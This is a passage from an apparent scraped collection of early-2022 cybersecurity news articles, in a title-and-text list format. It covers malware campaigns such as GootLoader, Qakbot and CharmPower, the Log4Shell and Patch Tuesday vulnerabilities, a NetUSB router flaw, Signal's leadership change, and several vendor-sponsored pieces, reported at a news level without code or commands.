GootLoader resorts to the first technique.\n\nIn March 2021, details emerged of a global drive-by download offensive that involved tricking unsuspecting victims into visiting compromised WordPress websites belonging to legitimate businesses via a technique called search engine poisoning that pushes these sites to the top of the search results.\n\n“Their modus operandi (MO) is to entice a business professional to one of the compromised websites and then have them click on the link, leading to Gootloader, which attempts to retrieve the final payload, whether it be ransomware, a banking trojan or intrusion tool/credential stealer,“ the researchers explained in a write-up.\neSentire estimates that over 100,000 malicious webpages were set up last year across websites representing entities in the hotel industry, high-end retail, education, healthcare, music and visual arts, with one of the hacked websites hosting 150 rogue pages designed to social engineer users searching for postnuptial or intellectual property agreements.\n\nThe websites, for their part, are broken into by exploiting security vulnerabilities in the WordPress content management system (CMS), effectively permitting the attackers to clandestinely inject the pages of their liking without the website owner’s knowledge.\n\nThe nature of GootLoader and the way it’s designed to provide a backdoor into systems implies that the goal of the attacks could be intelligence gathering, but it could also be utilised as a tool for delivering additional damaging payloads, including Cobalt Strike and ransomware, to compromised systems for follow-on attacks.\n“GootLoader relies heavily on social engineering to establish its foothold, from poisoning Google search results to fashioning the payload,“ said Keegan Keplinger, research and reporting lead for eSentire’s Threat Response Unit (TRU).\n“GootLoader’s operators invite employees to seek, download, and execute their malware under the guise of a free business agreement template. This is particularly effective against legal firms, who may encounter uncommon requests from clients.“\nTo mitigate such threats, it’s recommended that organizations put in place a vetting process for business agreement samples, train employees to open documents only from trusted sources, and ensure that the content downloaded matches the content intended to be downloaded.\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers have decoded the mechanism by which the versatile Qakbot banking trojan handles the insertion of encrypted configuration data into the Windows Registry.\nQakbot, also known as QBot, QuackBot and Pinkslipbot, has been observed in the wild since 2007. Although mainly fashioned as an information-stealing malware, Qakbot has since shifted its goals and acquired new functionality to deliver post-compromise attack platforms such as Cobalt Strike Beacon, with the final objective of loading ransomware on infected machines.\n\n“It has been continually developed, with new capabilities introduced such as lateral movement, the ability to exfiltrate email and browser data, and to install additional malware,“ Trustwave researchers Lloyd Macrohon and Rodel Mendrez said in a report shared with The Hacker News.\nIn recent months, phishing campaigns have culminated in the distribution of a new loader called SQUIRRELWAFFLE, which acts as a channel to retrieve final-stage payloads such as Cobalt Strike and QBot.\n\nNewer versions of Qakbot have also gained the ability to hijack email and browser data as well as insert encrypted configuration information pertaining to the malware into the registry as opposed to writing them to a file on disk as part of its attempts to leave no trace of the infection.\n“While QakBot is not going fully fileless, its new tactics will surely lower its detection,“ Hornetsecurity researchers pointed out in December 2020.\n\nTrustwave’s analysis into the malware aims to reverse engineer this process and decrypt the configuration stored in the registry key, with the cybersecurity company noting that the key used to encrypt the registry key value data is derived from a combination of computer name, volume serial number, and the user account name, which is then hashed and salted along with a one-byte identifier (ID).\n“The SHA1 hash result will be used as a derived key to decrypt the registry key value data respective to the ID using the RC4 algorithm,“ the researchers said, in addition to making available a Python-based decryptor utility that can be used to extract the configuration from the registry.\n\n\nFound this article interesting?

'text': 'An Iranian state-sponsored actor has been observed scanning and attempting to abuse the Log4Shell flaw in publicly-exposed Java applications to deploy a hitherto undocumented PowerShell-based modular backdoor dubbed “CharmPower“ for follow-on post-exploitation.\n“The actor’s attack setup was obviously rushed, as they used the basic open-source tool for the exploitation and based their operations on previous infrastructure, which made the attack easier to detect and attribute,“ researchers from Check Point said in a report published this week.\nThe Israeli cybersecurity company linked the attack to a group known as APT35, which is also tracked using the codenames Charming Kitten, Phosphorus, and TA453, citing overlaps with toolsets previously identified as infrastructure used by the threat actor.\n\nLog4Shell aka CVE-2021-44228 (CVSS score: 10.0) concerns a critical security vulnerability in the popular Log4j logging library that, if successfully exploited, could lead to remote execution of arbitrary code on compromised systems.\nThe ease of the exploitation coupled with the widespread use of Log4j library has created a vast pool of targets, even as the shortcoming has attracted swarms of bad actors, who have seized on the opportunity to stage a dizzying array of attacks since its public disclosure last month.\nWhile Microsoft previously pointed out APT35’s efforts to acquire and modify the Log4j exploit, the latest findings show that the hacking group has operationalized the flaw to distribute the PowerShell implant capable of retrieving next-stage modules and exfiltrating data to a command-and-control (C2) server.\n\nCharmPower’s modules also support a variety of intelligence gathering functionality, including features to gather system information, list installed applications, take screenshots, enumerate running processes, execute commands sent from the C2 server, and clean up any signs of evidence created by these components.\n\nThe disclosure comes as Microsoft and the NHS cautioned that internet-facing systems running VMware Horizon are being targeted to deploy web shells and a new strain of ransomware called NightSky, with the tech giant connecting the latter to a China-based operator dubbed DEV-0401, which has also deployed LockFile, AtomSilo, and Rook ransomware in the past.\nWhat’s more, Hafnium, another threat actor group operating out of China, has also been observed utilizing the vulnerability to attack virtualization infrastructure to extend their typical targeting, Microsoft noted.\n“Judging by their ability to take advantage of the Log4j vulnerability and by the code pieces of the CharmPower backdoor, the actors are able to change gears rapidly and actively develop different implementations for each stage of their attacks,“ the researchers said.\n\n\nFound this article interesting?

{'title': 'Meeting Patching-Related Compliance Requirements with TuxCare',
'text': 'Cybersecurity teams have many demands competing for limited resources. Restricted budgets are a problem, and restricted staff resources are also a bottleneck. There is also the need to maintain business continuity at all times. It’s a frustrating mix of challenges – with resources behind tasks such as patching rarely sufficient to meet security prerogatives or compliance deadlines.\nThe multitude of different security-related standards have ever stringent deadlines, and it is often the case that business needs don’t necessarily align with those requirements. At the core of what TuxCare does is automated live patching – a way to consistently keep critical services safe from security threats, without the need to expend significant resources in doing so, or the need to live with business disruption.\nIn this article, we’ll outline how TuxCare helps organizations such as yours deal better with security challenges including patching, and the support of end-of-life operating systems.\nThe patching conundrum\nEnterprise Linux users know that they need to patch – patching is highly effective in closing security loopholes, while it’s also a common compliance requirement. Yet in practice, patching doesn’t occur as frequently, or as tightly as it should. Limited resources are a constraint, but patching has business implications too which can lead to patching delays.\nTake patching the kernel of a Linux OS, for example. Typically, that involves restarting the OS, which means the services running on the OS go offline, with predictable business disruption. No matter what you’re trying to patch, the problem remains – it’s impossible to take databases, virtualized workloads, and so forth offline without anyone noticing. The alternatives are complex workarounds or delaying patching.\nRisks of not patching in time\nBut as we all know, delaying patching carries significant risks, of which there are two big ones. First, there are compliance requirements that state a maximum window between patch release and applying that patch.\nOrganizations that struggle to overcome the business disruption of patching risk delaying patching to the extent that they run workloads in breach of compliance regulations such as the recent CISA mandate. That means a risk of fines or even loss of business.\nHowever, even fully compliant workloads leave a window of exposure – the time between the moment criminal actors develop the ability to exploit a vulnerability and the moment it gets patched. \nIt leaves an opportunity for intruders to enter your systems and cause damage. Delayed patching leaves an extended window, but even patching within compliance regulations can still lead to a very long risk window. It is generally accepted that, today, 30 days is the common denominator of the most common cybersecurity standards for the “accepted“ delay between vulnerability disclosure and patching, but that is still a very large risk window – you’ll meet the compliance requirements, but are your systems really safe? Only if organizations patch as soon as a patch is released is this window truly minimized.\nWhile it’s impossible to completely avoid a window where vulnerabilities are exploitable – after all, the recent Log4j vulnerability was actively being exploited at least a week before it was disclosed – it’s still nonetheless imperative to minimize this window.\nBridging the patching gap with TuxCare\nTuxCare identified an urgent need to remove the business disruption element of patching. Our live kernel patching solution, first rolled out under the brand KernelCare, enables companies such as yours to patch even the most critical workloads without disruption.\nInstead of the patch, reboot, and hope that everything works routine, organizations that use the KernelCare service can rest assured that patching happens automatically and almost as soon as a patch is released.\nKernelCare addresses both compliance concerns and threat windows by providing live patching for the Linux Kernel within hours of a fix being available, thus reducing the exposure window and meeting or exceeding requirements in compliance standards.\nTimeframes around patching have consistently been shrinking in the past couple of decades, from many months to just 30 days to combat fast-moving threats – KernelCare narrows the timeframe to what’s about as minimal a window as you could get.\nKernelCare achieves this without disrupting regular operation of servers and services. End users will never realize the patch has been deployed. One moment a server is vulnerable, and the next it simply isn’t vulnerable anymore.\nWhat about patching libraries?\nWe’ve got you covered there too, thanks to LibrayCare, TuxCare’s solution for critical system libraries, which covers patching of other critical components like glibc and OpenSSL. Those are fundamental components of any Linux system that are heavily used by third-party developers for providing functionality such as IO or encryption.\nLibraries are a high profile target for malicious actors looking to get a foothold in a system. OpenSSL alone is associated with a list of hundreds of known vulnerabilities. The unfortunate side effect of being used by other applications is that any patching applied to a library will incur business-disrupting downtime, just like kernel patching.\nAgain, that is the factor that contributes the most to patch deployment delays - the inability to deploy patches without affecting the regular flow of business activities on affected systems. For libraries, it also requires planning, approval, and implementation of maintenance windows, an anachronism in a modern IT environment. Thanks to live patching, LibraryCare can effectively patch libraries without requiring even a single service restart on other applications.\nEnsuring database security in running, live database services\nDatabases store the most valuable assets in a company’s arsenal, its data. Keeping it safe is paramount for business continuity and effectiveness, and this is covered by multiple standards like GDPR, the CCPA and other industry-specific standards in, say, healthcare and finance, that translate data breaches into heavy, business-threatening fines. For example, Amazon reported the largest GDPR fine to date, with a staggering USD 887m in value.\nHowever, data has to be reachable at all times under penalty of, again, causing business disruption if patching is attempted. For this reason, the TuxCare team extended live patching technology to also cover database systems like MariaDB, MySQL or PostgreSQL, the most commonly used open-source database systems today.\nNow, you can keep your database backend secure from known vulnerabilities, with the timely deployment of patches that no longer need to be scheduled weeks or months in advance. It helps meet data security requirements transparently and with no friction with other users and systems.\nVirtualization is covered too\nAnother TuxCare product, QEMUcare, takes away the complexity of patching virtualization hosts that rely on QEMU. Prior to live patching, getting QEMU up to date was a task that used to imply extensive migration of virtual machines around nodes, a complex and error-prone task that would impact performance and usability of those virtual machines.\nPatching used to impact the end-user experience of virtual tenants significantly. QEMUcare solves this by live patching QEMU while the virtual machines are happily running on the system.\nTraditionally, virtual infrastructure was planned in such a way that additional capacity was available to cover for some nodes going down for maintenance, thus wasting resources that would be just sitting there most of the time twiddling its proverbial IT thumbs.\nIf you don’t need to take your hosts down or migrate virtual machines around anymore, you don’t need to acquire extra hardware to accommodate those operations, saving on equipment, electricity, cooling, and vendor support bills. Your systems are patched within a very short period after patches are available and your infrastructure is more secure.\nLegacy systems are not left behind\nCompanies commonly have legacy systems that for one reason or another have not or cannot be migrated to more recent operating systems. These older systems will go out of support eventually, thus crossing the commonly referred to “end-of-life“ (EOL) date.\nAt this point in time, the vendor behind those systems will no longer support them or provide patches for emerging threats. That means that organizations running those systems automatically fail compliance standards because, of course, you can’t patch if you don’t have patches available to you.\nDeveloping patches in-house is a steep hill to climb. The amount of effort that goes into the development, testing, deployment, and maintenance of patches quickly gets overwhelming in anything other than the simplest situations. Even then, you won’t have the comfort of having a dedicated team of developers with the experience and expertise to help you if anything goes wrong.\nTuxCare has that experience, and our Extended Lifecycle Support (ELS) service is the result. It has, for years, helped users of EOL Linux distributions such as CentOS 6, Oracle 6, and Ubuntu LTS. TuxCare backports relevant fixes to the most used system utilities and libraries.\nTuxCare provides ongoing cover for patching\nWe are continuously adding EOL systems as these reach end of life, with CentOS 8 the latest addition to the supported distribution list, given that CentOS 8 reached EOL on January 1st, 2022.\nWith our established live patching service now also joined by patching across libraries, virtualization and more, TuxCare provides a truly comprehensive patching service that fills the major security gaps that so many organizations battle with.\nThanks to live patching you can now rest assured that your critical systems are protected against newly discovered exploits as fast as possible, and with minimal disruption. That powerful combination gives TuxCare live patching the power to be a key weapon in your cybersecurity arsenal.\n\n\nFound this article interesting?

The group is believed to have been active at least since 2017.\nRecent intrusions mounted by the adversary have involved exploiting the ZeroLogon (CVE-2020-1472) vulnerability as well as leveraging remote desktop management tools such as ScreenConnect and Remote Utilities to deploy custom backdoors that could enable the attackers to gain unauthorized access to sensitive data.\n\nLast month, Symantec’s Threat Hunter Team publicized findings about a new wave of hacking activities unleashed by the Muddywater group against a string of telecom operators and IT companies throughout the Middle East and Asia during the previous six months using a blend of legitimate tools, publicly available malware, and living-off-the-land (LotL) methods.\nAlso incorporated into its toolset is a backdoor named Mori and a piece of malware called PowGoop, a DLL loader designed to decrypt and run a PowerShell-based script that establishes network communications with a remote server.\nMalware samples attributed to the advanced persistent threat (APT) have been made available on the VirusTotal malware aggregation repository, which can be accessed here.\n“Analysis of MuddyWater activity suggests the group continues to evolve and adapt their techniques,“ SentinelOne researcher Amitai Ben Shushan Ehrlich said. “While still relying on publicly available offensive security tools, the group has been refining its custom toolset and utilizing new techniques to avoid detection.“\n\n\nFound this article interesting?

{'title': 'Hackers Use Cloud Services to Distribute Nanocore, Netwire, and AsyncRAT Malware',
'text': 'Threat actors are actively incorporating public cloud services from Amazon and Microsoft into their malicious campaigns to deliver commodity remote access trojans (RATs) such as Nanocore, Netwire, and AsyncRAT to siphon sensitive information from compromised systems.\nThe spear-phishing attacks, which commenced in October 2021, have primarily targeted entities located in the U.S., Canada, Italy, and Singapore, researchers from Cisco Talos said in a report shared with The Hacker News.\nUsing existing legitimate infrastructure to facilitate intrusions is increasingly becoming part of an attacker’s playbook as it obviates the need to host their own servers, not to mention be used as a cloaking mechanism to evade detection by security solutions.\n\nIn recent months, collaboration and communication tools like Discord, Slack, and Telegram have found a place in many an infection chain to commandeer and exfiltrate data from the victim machines. Viewed in that light, the abuse of cloud platforms is a tactical extension that attackers could exploit as a first step into a vast array of networks.\n\n“There are several interesting aspects to this particular campaign, and it points to some of the things we commonly see used and abused by malicious actors,“ Nick Biasini, head of outreach at Cisco Talos, told The Hacker News via email.\n“From the use of cloud infrastructure to host malware to the abuse of dynamic DNS for command-and-control (C2) activities. Additionally, the layers of obfuscation point to the current state of criminal cyber activities, where it takes lots of analysis to get down to the final payload and intentions of the attack.“\nAs with many of these types of campaigns, it all starts with an invoice-themed phishing email containing a ZIP file attachment that, when opened, triggers an attack sequence that downloads next-stage payloads hosted on an Azure Cloud-based Windows server or an AWS EC2 instance, ultimately culminating in the deployment of different RATs, including AsyncRAT, Nanocore, and Netwire.\n\nThe trojans, once installed, can not only be used to gain unauthorized access to confidential data, but can also be put to use by the attackers to monetize access to the compromised systems for further follow-on attacks by ransomware affiliates and other cybercrime groups.\nAlso noteworthy is the use of DuckDNS, a free dynamic DNS service, to create malicious subdomains to deliver malware, with some of the actor-controlled malicious subdomains resolving to the download server on Azure Cloud while other servers are operated as C2 for the RAT payloads.\n“Malicious actors are opportunistic and will always be looking for new and inventive ways to both host malware and infect victims,“ Biasini said. “The abuse of platforms such as Slack and Discord as well as the related cloud abuse are part of this pattern. We also commonly find compromised websites being used to host malware and other infrastructure as well and again points to the fact that these adversaries will use any and all means to compromise victims.“\n\n\nFound this article interesting?

{'title': 'XDR: Redefining the game for MSSPs serving SMBs and SMEs',
'text': 'SMBs and SMEs are increasingly turning to MSSPs to secure their businesses because they simply do not have the resources to manage an effective security technology stack. However, it’s also challenging for MSSPs to piece together an effective but manageable security technology stack to protect their clients, especially at an affordable price point.\nThis is where Extended Detection and Response (XDR) comes in and can help MSSPs boost their profitability from SMB and SME and improve their protections. XDR is heating up within the MSSP market as these security service providers stand to gain tremendous financial and operational benefits from this nascent technology. XDR promises far better security outcomes at a lower cost than the current security stack approaches most MSSPs currently have in place.\nOne sticky point that keeps arising in the XDR discussion has to do with the different technology approaches XDR providers rely upon to deliver platform capabilities. Most of us have heard the three primary approaches mentioned – Native XDR, Open XDR and Hybrid XDR – but still don’t understand the key benefits and drawbacks of each. Fortunately, an informative guide was just released (click here to download) to help MSSPs understand and evaluate each of these approaches. \nPotential Benefits XDR Can Provide to MSSPs \nBefore we dig into each of the approaches, let’s review the key benefits we’ve heard that XDR could potentially provide to MSSPs. With that laid out, we can then evaluate how each of the three XDR approaches are positioned to deliver on those promises. \nGenerally, XDR should provide MSSPs with the following capabilities - at a minimum:\nExtended telemetry for enhanced threat visibilityCorrelate security data to improve accuracy and consolidate alerts into incidentsExpand, coordinate and automate response actions across the environment\nThe ultimate benefit provided by these capabilities is better security outcomes than would otherwise be achievable by purchasing and integrating a traditional set of security technologies. Because an XDR platform is purpose built to improve and automate threat detection, investigation and response, it can theoretically prevent a broader range of threats with far better accuracy. \nBeyond security improvements, XDR solutions can also reduce costs for MSSPs. Because some XDR platforms include multiple telemetry sources and security capabilities, they may allow MSSPs to replace existing technologies. The enhanced automation provided by some XDR solutions may allow MSSPs to reduce staff dependency by significantly reducing manual investigations and response requirements. \nThe 3 XDR Approaches \nLet’s face it, every security provider yearns to be in a hot technology space. Because security remains a dynamic market, it only makes sense that some vendors seek to realign their technology with what’s hot in the hopes of aligning themselves with the spending dujour. The XDR approach provided by a particular vendor is fundamentally based on the current set of offerings provided by that vendor. Let’s go through the three approaches and you’ll see what I mean. For a fuller explanation and discussion, access Cynet’s new guide here [LINK HERE].\nNative XDR\nA single vendor that offers all components of an XDR solution is considered Native XDR. This means that the buyer will not need to purchase and integrate additional technology solutions into the Native XDR platform to enjoy the benefits. Generally speaking, Native XDR platforms are provided by vendors with strong EDR offerings.\nBecause a Native XDR platform contains all components needed out of the box, it should work seamlessly with no integration required. This approach provides a turnkey, fully operational platform which may allow an MSSP to eliminate redundant tools and not worry about ongoing integration and upgrade issues associated with a multi-vendor technology stack. The one downside is that a Native XDR is not customizable, so be sure the solution provides everything you need. \nOpen XDR\nAn XDR platform that requires integration with multiple third-party providers, especially for telemetry, is considered an Open XDR platform. An Open XDR platform integrates and correlates signals from 3rd party tools for threat detection and also relies on the 3rd party tools to implement suggested response actions. Generally speaking, Open XDR platforms are provided by existing SIEM and SOAR providers, as well as newer technology entrants, notably those without an EDR offering.\nOpen XDR platforms allow MSSPs to continue using most of their current toolset, or whichever components can be integrated into the Open XDR platform. Open XDR platforms are flexible, so MSSPs can swap in and out best of breed tool components. However, Open XDR platforms will add cost as most technologies in place will need to remain to feed the Open XDR engine. And the jury is still out exactly how seamlessly third-party tools can be integrated and orchestrated with an Open XDR platform. If SIEM is any indicator, caveat emptor. \nHybrid XDR\nA single vendor offering most to all components of an XDR solution, while also allowing 3rd party tool integration is considered Hybrid XDR. This means that the buyer will not necessarily need to purchase and integrate additional technology solutions into the XDR platform to enjoy the benefits but can do so to extend or replace the technologies native to the platform. Hybrid XDR platforms are generally provided vendors with EDR solutions, especially larger vendors looking to include a broad portfolio of solutions into the platform. \nHybrid XDR platforms could theoretically provide the benefits of both Native and Open XDR platforms. If the Hybrid XDR provider has a robust set of native tools and if the Hybrid XDR platform can seamlessly integrate a variety of third-party tools, this may be the case. However, some Hybrid XDR providers essentially piece together a library of tools that are poorly integrated and barely work together. \nFinal Thoughts \nThe benefits MSSPs derive from an XDR platform will vary greatly depending on the providers approach and actual implementation of that approach. While the promise of XDR is great, MSSPs must be wary of the current crop of XDR solutions as security solution vendors are clamoring to align with this burgeoning technology, regardless of their ability to deliver. \nDownload the XDR Guide for MSSPs here\n\n\nFound this article interesting?

{'title': 'First Patch Tuesday of 2022 Brings Fix for a Critical ’Wormable’ Windows Vulnerability',
'text': 'Microsoft on Tuesday kicked off its first set of updates for 2022 by plugging 96 security holes across its software ecosystem, while urging customers to prioritize patching for what it calls a critical “wormable“ vulnerability.\nOf the 96 vulnerabilities, nine are rated Critical and 89 are rated Important in severity, with six zero-day publicly known at the time of the release. This is in addition to 29 issues patched in Microsoft Edge on January 6, 2022. None of the disclosed bugs are listed as under attack.\nThe patches cover a swath of the computing giant’s portfolio, including Microsoft Windows and Windows Components, Exchange Server, Microsoft Office and Office Components, SharePoint Server, .NET Framework, Microsoft Dynamics, Open-Source Software, Windows Hyper-V, Windows Defender, and Windows Remote Desktop Protocol (RDP).\nChief among them is CVE-2022-21907 (CVSS score: 9.8), a remote code execution vulnerability rooted in the HTTP Protocol Stack. “In most situations, an unauthenticated attacker could send a specially crafted packet to a targeted server utilizing the HTTP Protocol Stack (http.sys) to process packets,“ Microsoft noted in its advisory.\nRussian security researcher Mikhail Medvedev has been credited with discovering and reporting the error, with the Redmond-based company stressing that it’s wormable, meaning no user interaction is necessary to trigger and propagate the infection.\n\n“Although Microsoft has provided an official patch, this CVE is another reminder that software features allow opportunities for attackers to misuse functionalities for malicious acts,“ Danny Kim, principal architect at Virsec, said.\nMicrosoft also resolved six zero-days as part of its Patch Tuesday update, two of which are an integration of third-party fixes concerning the open-source libraries curl and libarchive.\nCVE-2021-22947 (CVSS score: N/A) – Open-Source curl Remote Code Execution VulnerabilityCVE-2021-36976 (CVSS score: N/A) – Open-Source libarchive Remote Code Execution VulnerabilityCVE-2022-21836 (CVSS score: 7.8) – Windows Certificate Spoofing VulnerabilityCVE-2022-21839 (CVSS score: 6.1) – Windows Event Tracing Discretionary Access Control List Denial of Service VulnerabilityCVE-2022-21874 (CVSS score: 7.8) – Windows Security Center API Remote Code Execution VulnerabilityCVE-2022-21919 (CVSS score: 7.0) – Windows User Profile Service Elevation of Privilege Vulnerability\nAnother critical vulnerability of note concerns a remote code execution flaw (CVE-2022-21849, CVSS score: 9.8) in Windows Internet Key Exchange (IKE) version 2, which Microsoft said could be weaponized by a remote attacker to “trigger multiple vulnerabilities without being authenticated.“\nOn top of that, the patch also remediates a number of remote code execution flaws affecting Exchange Server, Microsoft Office (CVE-2022-21840), SharePoint Server, RDP (CVE-2022-21893), and Windows Resilient File System as well as privilege escalation vulnerabilities in Active Directory Domain Services, Windows Accounts Control, Windows Cleanup Manager, and Windows Kerberos, among others.\nIt’s worth stressing that CVE-2022-21907 and the three shortcomings uncovered in Exchange Server (CVE-2022-21846, CVE-2022-21855, and CVE-2022-21969, CVSS scores: 9.0) have all been labeled as “exploitation more likely,“ necessitating that the patches are applied immediately to counter potential real-world attacks targeting the weaknesses. The U.S. National Security Agency (NSA) has been acknowledged for flagging CVE-2022-21846.\n“This massive Patch Tuesday comes during a time of chaos in the security industry whereby professionals are working overtime to remediate Log4Shell — reportedly the worst vulnerability seen in decades,“ Bharat Jogi, director of vulnerability and threat Research at Qualys, said.\n\n“Events such as Log4Shell […] bring to the forefront the importance of having an automated inventory of everything that is used by an organization in their environment,“ Jogi added, stating “It is the need of the hour to automate deployment of patches for events with defined schedules (e.g., MSFT Patch Tuesday), so security professionals can focus energy to respond efficiently to unpredictable events that pose dastardly risk.“\nSoftware Patches from Other Vendors\nBesides Microsoft, security updates have also been released by other vendors to rectify several vulnerabilities, counting —\nAdobeAndroidCiscoCitrixGoogle ChromeJuniper NetworksLinux distributions Oracle Linux, Red Hat, and SUSEMozilla Firefox, Firefox ESR, and ThunderbirdSambaSAPSchneider ElectricSiemensVMware, andWordPress\n\n\nFound this article interesting?

{'title': 'How Can You Leave Log4J in 2021?',
'text': 'With the last month of 2021 dominated by the log4J vulnerabilities discovery, publication, and patches popping up in rapid succession, odds are you have patched your system against Log4J exploitation attempts. At least some systems, if not all. You might even have installed the latest patch – at the time of writing, that is 2.17.1, but, if the last rapid patching cycle persists, it might have changed by the time this is published.\nIn the meantime, defenders might have been working overtime to plug Log4J born security gaps, but so did cyber-attackers. Log4J’s well-deserved fame also alerted cyber-attackers to a potential entry pathway into their target. And, while log4J will hopefully vanish from the headlines, cyber-attackers are likely to continue trying to exploit it in the hope of finding unpatched or incompletely patched targets.\nAs human error still accounts for 95% of all security breaches, cyber-attackers actively rely on these human errors to exploit them and take advantage of a false sense of security derived, assuming that patches have been applied successfully.\nThe Log4J saga is a perfect storm to generate a high number of patching errors as it combines:\n1 —Acute stress: Log4J was named the worse vulnerability in decades and qualified by Cloudflare as “so bad we’re going to try and roll out at least some protection for all @Cloudflare customers by default, even free customers who do not have our WAF.“\n\nThe pressure to patch before any vulnerability could be exploited by cyber-attacker was intense. As the crisis worsened with a combination of new patch publication and a growing list of affected vendors, the level of stress only intensified. Yet, a 2015 NASA study demonstrates that “Situational stress can adversely affect the cognition and skilled performance of pilots, as well as experts in other domains.“ \n2 — Frantic patching cycles: Between December 6 and December 27, four distinct patches were published, each consisting of a new version of the Log4J, so each required upgrading it to a new version, and do so without breaking anything. So many updates in such a short time negatively impact the level of trust in the value of the patch and i increase the odds of patching errors or oversight.3 — The odds of missing at least one instance of Log4J are high: All version of Log4J from the September 2013 V2.0-beta9 onwards carry those vulnerabilities. Yet, as all Java files, Log4J can nested a few layers deep into other files, and can easily be missed when frenetically applying patches, and, to make matters worse, Log4J is extremely popular, with a reported 80% of Java affected packages that cannot be updated directly and require coordination between different project teams to effectively patch.\nThis is welcome news for cyber-attackers who are likely to continue weaponizing Log4J vulnerabilities for months and years to come.\nThe best defense against current and future Log4J related exploits is to validate that your patching is comprehensive and adequately applied. Running Log4J updated vulnerability scanners is a good starting point but, unfortunately, no single scanner can spot all the indirect or transitive Log4J dependencies, especially when it gets pulled in as a transitive dependency that lacks an explicit definition of Log4J.\nScanners’ Log4J blind spots mean that validating the efficiency of the patching process through offensive testing is a non-optional necessity. This methodology determines if the rules you have set up to deflect Log4J malformed requests are effective or if more tuning is required. A log4J execution method could be used by red teamers out-of-the-box.\nUsing these offensive testing techniques, some clients effectively detected supply chain induced Log4J vulnerabilities before the supplier had published a patch.\nThe advantage of running comprehensive continuous security validation is that the resulting tightening of first- and third-party security controls do limit exposure to unknown unknowns as it exposes weak spots and provides actionable recommendations to close them. \nTo avoid the risks stemming from the deadly combination of acute stress, frantic patching cycle and hidden instances, whether for Log4J or the next big one – and even small one – it pays to tun continuous validation that not only scan for vulnerabilities but also safely tests if production-safe payload were effectively detected and stopped, and thoroughly assesses the effectiveness of your security policies and controls pre- and post-patching.\nFor more information, visit cymulate.com.\n\n\n\nFound this article interesting?

'text': 'Cybersecurity researchers have detailed a high severity flaw in KCodes NetUSB component that’s integrated into millions of end-user router devices from Netgear, TP-Link, Tenda, EDiMAX, D-Link, and Western Digital, among others.\nKCodes NetUSB is a Linux kernel module that enables devices on a local network to provide USB-based services over IP. Printers, external hard drives, and flash drives plugged into a Linux-based embedded system (e.g., a router) are made available via the network using the driver.\n\nCVE-2021-45608 (CVSS score: 9.8), as the security flaw is tracked as, relates to a buffer overflow vulnerability that, if successfully exploited, can allow attackers to execute code remotely in the kernel and perform malicious activities of their choice, according to a report shared by SentinelOne with The Hacker News.\nThis is the latest in a string of NetUSB vulnerabilities that has been patched in recent years. In May 2015, researchers from SEC Consult disclosed another buffer overflow flaw (CVE-2015-3036) that could result in a denial-of-service (DoS) or code execution.\n\nThen in June 2019, Cisco Talos divulged details of two weaknesses in NetUSB (CVE-2019-5016 and CVE-2019-5017) that could allow an attacker to inappropriately force select Netgear wireless routers into disclosing sensitive information and even giving the attacker the ability to remotely execute code.\n\nFollowing responsible disclosure to KCodes on September 20, 2021, the Taiwanese company issued a patch to all vendors on November 19, after which Netgear released firmware updates containing fixes for the vulnerability.\nSentinelOne has refrained from releasing a proof-of-concept (PoC) code in light of the fact that other vendors are still in the process of shipping updates. But the cybersecurity firm cautioned the possibility of an exploit emerging in the wild despite the technical complexity involved, making it imperative that users apply the fixes to mitigate any potential risk.\n“Since this vulnerability is within a third-party component licensed to various router vendors, the only way to fix this is to update the firmware of your router, if an update is available,“ researcher Max Van Amerongen said. “It is important to check that your router is not an end-of-life model as it is unlikely to receive an update for this vulnerability.“\n\n\nFound this article interesting?

'text': 'Moxie Marlinspike, the founder of the popular encrypted instant messaging service Signal, has announced that he is stepping down as the chief executive of the non-profit in a move that has been underway over the last few months.\n“In other words, after a decade or more, it’s difficult to overstate how important Signal is to me, but I now feel very comfortable replacing myself as CEO based on the team we have, and also believe that it is an important step for expanding on Signal’s success,“ Marlinspike said in a blog post on Monday.\nExecutive chairman and WhatsApp co-founder Brian Acton, who famously urged users to #DeleteFacebook in March 2018 and founded the Signal Foundation along with Marlinspike after he walked away from the social media giant in 2017 over a conflict with Facebook’s plans to monetize WhatsApp, will serve as the interim CEO while the search for a replacement is on.\n\nFounded in July 2014, Signal has more than 40 million monthly users, in part driven by a surge of new users in January 2021 when Meta-owned WhatsApp enacted a controversial policy change that sparked a privacy backlash over the nature of personal information shared with its parent company.\nBut the communication app’s rapid growth has had its share of downsides, what with the company’s employees raising concerns about the fallout stemming from potential misuse of the service by malicious actors, which could add ammunition to ongoing debates about weakening encryption protections to facilitate law enforcement investigations.\nComplicating matters further is its decision to integrate MobileCoin, purportedly an “encrypted-focused cryptocurrency“ into the app to facilitate peer-to-peer payments, a shift that could potentially put private messaging at risk by not only attracting regulatory scrutiny but could also serve as an open invitation for criminals to exploit the platform to their benefit.\n\n“Signal and WhatsApp have effectively protected end-to-end encryption from multiple legal attacks at the state and federal level,“ Alex Stamos, Facebook’s former chief security officer, told The Platformer last week.\n“But the addition of pseudo-anonymous money transfer functions greatly increases their legal attack surface, while creating the possibility of real-life harms (extortion, drug sales, CSAM sales) that will harm them in court, legislatures and public opinion.“\nSecurity researcher Bruce Schneier had a similar take last year when Signal began testing support for MobileCoin payments.\n“Secure communications and secure transactions can be separate apps, even separate apps from the same organization,“ Schneier said. “End-to-end encryption is already at risk. Combining it with a cryptocurrency means that the whole system dies if any part dies.“\n\n\nFound this article interesting?

{'title': '2022 Cybersecurity Predictions from Lookout: Work From Anywhere Ends On-Premises Security',
'text': 'Lookout, an endpoint-to-cloud cyber security company, have put together their cyber security predictions for 2022. \n1 — Cloud connectivity and cloud-to-cloud connectivity will amplify supply-chain breaches\nOne area organizations need to continue to monitor in 2022 is the software supply chain. We tend to think of cloud apps as disparate islands used as destinations by endpoints and end-users to collect and process data. The reality is that these apps constantly communicate with different entities and systems like software-update infrastructure and with each other — interactions that are often not monitored.\nIn late 2020, the cybersecurity community uncovered one of the worst breaches in recent memory when the SolarWinds software-publishing infrastructure was infiltrated. More than 100 organizations, including nine U.S. federal agencies, were compromised by trojanized updates that opened backdoors to their infrastructure. This is a prime example of how a weak supply chain can be used to amplify the attack by taking advantage of cloud interconnectivity. Now that this attack vector was proven to be successful, expect copycats to follow suit in 2022.\nIn addition to SolarWinds-type attacks, Lookout predicts threat actors to look into exploiting another seldomly-monitored area: cloud-to-cloud interaction. For example, it is very common for organizations to use HR software to capture an employee’s personal and financial information, which is then shared to a payroll system. Once apps are connected to each other, seldom do enterprises monitor these automated workflows for changes in behavior. An attacker could exploit this implicit trust between systems to siphon off sensitive data without anyone noticing.\n2 — User error and account compromises to become more pronounced\nOne of the major advantages of SaaS 